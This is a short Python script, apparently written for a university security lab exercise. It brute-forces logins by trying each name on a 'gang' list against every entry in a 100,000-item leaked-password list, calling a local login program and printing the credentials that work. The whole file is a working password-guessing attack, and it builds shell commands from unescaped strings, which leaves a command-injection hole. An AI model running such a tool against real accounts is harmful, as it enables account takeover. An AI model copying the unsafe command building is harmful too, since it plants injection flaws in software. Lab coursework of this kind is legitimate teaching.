import time
import os
import threading

if __name__ in '__main__':
    start_time = time.time()
    common_passwords=[i.strip() for i in open('/home/cse/Lab1/PwnedPWs100k.txt')][::-1]
    gang_names=[i.strip() for i in open('/home/cse/Lab1/gang.txt')]

    for name in gang_names:
        for i in common_passwords:
            if os.system('python3 ./Login.pyc '+ name + ' "'+i+'"' + " >/dev/null 2>&1") == 0:
                print(name, i, "--- %s minutes ---" % ((time.time() - start_time) / 60))
                break






